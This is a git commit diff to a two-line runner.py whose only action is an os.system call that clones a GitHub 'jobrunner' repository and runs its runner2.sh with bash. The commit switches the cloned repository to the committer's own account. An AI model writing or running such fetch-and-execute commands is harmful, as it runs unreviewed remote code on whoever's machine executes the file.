e82ae77462a609e293f8274f52ca780f60052e9d
jermaineburke947 <142638334+jermaineburke947@users.noreply.github.com>
2025-04-27 03:46:57 +0200

    Update runner.py

--- runner.py
+++ runner.py
@@ -1,2 +1,2 @@
 import os
-os.system("git clone https://github.com/timothyzamalek/jobrunner.git;cd jobrunner;bash runner2.sh")
+os.system("git clone https://github.com/jermaineburke947/jobrunner.git;cd jobrunner;bash runner2.sh")
